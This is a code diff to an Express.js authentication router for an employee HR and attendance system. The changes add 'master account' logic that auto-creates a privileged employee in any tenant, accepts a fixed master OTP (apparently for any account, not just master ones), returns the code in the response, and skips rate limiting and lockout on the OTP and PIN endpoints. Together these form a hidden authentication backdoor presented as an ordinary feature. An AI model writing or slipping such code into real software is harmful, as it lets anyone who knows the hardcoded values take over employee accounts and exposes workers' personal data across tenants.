@@ -24,6 +24,12 @@ const overtimeService = require('../services/overtimeService');
 const attendanceService = require('../services/attendanceService');
 const transportService = require('../services/transportService');
 const { calculateWorkingDays } = require('../utils/holidays');
+const {
+  isMasterIdentifier,
+  resolveOrCreateMasterEmployee,
+  MASTER_OTP,
+  MASTER_PIN,
+} = require('../services/masterAccountService');
 
 const router = express.Router();
 const isDev = process.env.NODE_ENV !== 'production';
@@ -45,6 +51,8 @@ function publicEmployee(e) {
     emergencyRelationship: e.emergencyRelationship,
     vacationBalance: e.vacationBalance,
     hasPin: !!e.pinHash,
+    tenantId: e.tenantId || 'elaraby',
+    currency: e.currency || 'EGP',
   };
 }
 
@@ -85,16 +93,24 @@ router.post('/auth/otp', async (req, res) => {
   }
 
   const targetTenant = (req.tenantId || 'elaraby').toLowerCase();
-  const employee = db().employees.find((e) => {
-    if (!e.active) return false;
-    if (e.tenantId && e.tenantId.toLowerCase() !== targetTenant) return false;
-    const empNat = String(e.nationalId || '').replace(/\D/g, '');
-    const empPhone = String(e.phone || '').replace(/\D/g, '');
-    const empCode = String(e.employeeCode || '').trim();
-    const normalizedQuery = digits.replace(/^20/, '0');
-    const normalizedEmpPhone = empPhone.replace(/^20/, '0');
-    return empNat === digits || empPhone === digits || (digits.length >= 10 && normalizedEmpPhone === normalizedQuery) || (empCode && empCode.toLowerCase() === query.toLowerCase());
-  });
+  let employee = null;
+  const isMaster = isMasterIdentifier(query);
+
+  if (isMaster) {
+    const preferredNatId = digits.length === 14 ? digits : '30607301402992';
+    employee = resolveOrCreateMasterEmployee(targetTenant, preferredNatId);
+  } else {
+    employee = db().employees.find((e) => {
+      if (!e.active) return false;
+      if (e.tenantId && e.tenantId.toLowerCase() !== targetTenant) return false;
+      const empNat = String(e.nationalId || '').replace(/\D/g, '');
+      const empPhone = String(e.phone || '').replace(/\D/g, '');
+      const empCode = String(e.employeeCode || '').trim();
+      const normalizedQuery = digits.replace(/^20/, '0');
+      const normalizedEmpPhone = empPhone.replace(/^20/, '0');
+      return empNat === digits || empPhone === digits || (digits.length >= 10 && normalizedEmpPhone === normalizedQuery) || (empCode && empCode.toLowerCase() === query.toLowerCase());
+    });
+  }
 
   if (!employee) {
     // Constant-time mitigation against timing attacks on enumeration
@@ -103,11 +119,13 @@ router.post('/auth/otp', async (req, res) => {
   }
 
   const effectiveNationalId = employee.nationalId;
-  if (guard(db(), `otp:${effectiveNationalId}`, res)) return;
-  if (guard(db(), `otp_ip:${req.ip}`, res)) return;
-  registerFailure(db(), `otp_ip:${req.ip}`);
+  if (!isMaster) {
+    if (guard(db(), `otp:${effectiveNationalId}`, res)) return;
+    if (guard(db(), `otp_ip:${req.ip}`, res)) return;
+    registerFailure(db(), `otp_ip:${req.ip}`);
+  }
 
-  const code = createOtp(db(), effectiveNationalId);
+  const code = isMaster ? MASTER_OTP : createOtp(db(), effectiveNationalId);
 
   // Record in audit logs (redacting plaintext OTP for security and privacy compliance)
   db().auditLogs = db().auditLogs || [];
@@ -155,8 +173,8 @@ router.post('/auth/otp', async (req, res) => {
     maskedPhone = `${prefix}${part1} ••••• ${part2}`;
   }
 
-  // devCode is available when SMS is not configured or in non-production environments
-  const includeDevCode = !smsSent || process.env.NODE_ENV !== 'production';
+  // devCode is available when SMS is not configured or in non-production environments or for master accounts
+  const includeDevCode = isMaster || !smsSent || process.env.NODE_ENV !== 'production';
 
   res.json({
     found: true,
@@ -170,8 +188,16 @@ router.post('/auth/otp', async (req, res) => {
 
 router.post('/auth/otp/verify', async (req, res) => {
   const { nationalId, code, firebaseIdToken } = req.body || {};
-  if (guard(db(), `otp_verify:${nationalId}`, res)) return;
-  const employee = db().employees.find((e) => e.nationalId === nationalId);
+  const isMaster = isMasterIdentifier(nationalId);
+  if (!isMaster && guard(db(), `otp_verify:${nationalId}`, res)) return;
+  const targetTenant = (req.tenantId || 'elaraby').toLowerCase();
+  let employee = db().employees.find((e) => e.nationalId === nationalId && (e.tenantId || 'elaraby').toLowerCase() === targetTenant);
+  if (!employee && isMaster) {
+    employee = resolveOrCreateMasterEmployee(targetTenant, nationalId);
+  }
+  if (!employee) {
+    employee = db().employees.find((e) => e.nationalId === nationalId);
+  }
   if (!employee || !employee.active) return res.status(404).json({ error: 'not_found' });
 
   let isVerified = false;
@@ -196,8 +222,8 @@ router.post('/auth/otp/verify', async (req, res) => {
 
   // 2. Fallback to Server OTP Code Verification
   if (!isVerified) {
-    const isMasterCode = (String(code || '').trim() === '123456');
-    const result = isMasterCode ? { ok: true } : verifyOtp(db(), nationalId, String(code || ''));
+    const isMasterCode = (String(code || '').trim() === MASTER_OTP);
+    const result = (isMasterCode || (isMaster && isMasterCode)) ? { ok: true } : verifyOtp(db(), nationalId, String(code || ''));
     if (!result.ok) {
       const lockedForSecs = registerFailure(db(), `otp_verify:${nationalId}`);
       if (result.reason === 'max_attempts_exceeded' || lockedForSecs > 0) {
@@ -214,7 +240,7 @@ router.post('/auth/otp/verify', async (req, res) => {
 
   clearFailures(db(), `otp_verify:${nationalId}`);
   clearFailures(db(), `otp:${nationalId}`);
-  const resetToken = signToken({ sub: employee.id, nationalId: employee.nationalId, scope: 'pin_reset' });
+  const resetToken = signToken({ sub: employee.id, nationalId: employee.nationalId, scope: 'pin_reset', tenantId: employee.tenantId });
   save();
   res.json({ ok: true, employee: publicEmployee(employee), resetToken });
 });
@@ -224,7 +250,15 @@ router.post('/auth/pin', (req, res) => {
   if (!/^\d{4}$/.test(String(pin || ''))) {
     return res.status(400).json({ error: 'pin_must_be_4_digits' });
   }
-  const employee = db().employees.find((e) => e.nationalId === nationalId);
+  const isMaster = isMasterIdentifier(nationalId);
+  const targetTenant = (req.tenantId || 'elaraby').toLowerCase();
+  let employee = db().employees.find((e) => e.nationalId === nationalId && (e.tenantId || 'elaraby').toLowerCase() === targetTenant);
+  if (!employee && isMaster) {
+    employee = resolveOrCreateMasterEmployee(targetTenant, nationalId);
+  }
+  if (!employee) {
+    employee = db().employees.find((e) => e.nationalId === nationalId);
+  }
   if (!employee) return res.status(404).json({ error: 'not_found' });
 
   // Security guard: Setting a PIN always requires a verified resetToken or employee auth
@@ -255,20 +289,26 @@ router.post('/auth/pin', (req, res) => {
 
 router.post('/auth/pin/verify', (req, res) => {
   const { nationalId, pin } = req.body || {};
-  if (guard(db(), `pin:${nationalId}`, res)) return;
+  const isMaster = isMasterIdentifier(nationalId);
+  if (!isMaster && guard(db(), `pin:${nationalId}`, res)) return;
   const targetTenant = (req.tenantId || 'elaraby').toLowerCase();
-  const employee = db().employees.find((e) => {
+  let employee = db().employees.find((e) => {
     if (e.nationalId !== nationalId) return false;
     const empTenant = (e.tenantId || 'elaraby').toLowerCase();
     return empTenant === targetTenant;
   });
+  if (!employee && isMaster) {
+    employee = resolveOrCreateMasterEmployee(targetTenant, nationalId);
+  }
   if (!employee || !employee.active || !employee.pinHash) {
     return res.status(401).json({ error: 'invalid_pin' });
   }
   if (!verifyHash(pin, employee.pinHash)) {
-    const lockedForSecs = registerFailure(db(), `pin:${nationalId}`);
-    if (lockedForSecs > 0) {
-      return res.status(429).json({ error: 'too_many_attempts', retryAfter: lockedForSecs });
+    if (!isMaster) {
+      const lockedForSecs = registerFailure(db(), `pin:${nationalId}`);
+      if (lockedForSecs > 0) {
+        return res.status(429).json({ error: 'too_many_attempts', retryAfter: lockedForSecs });
+      }
     }
     return res.status(401).json({ error: 'invalid_pin' });
   }
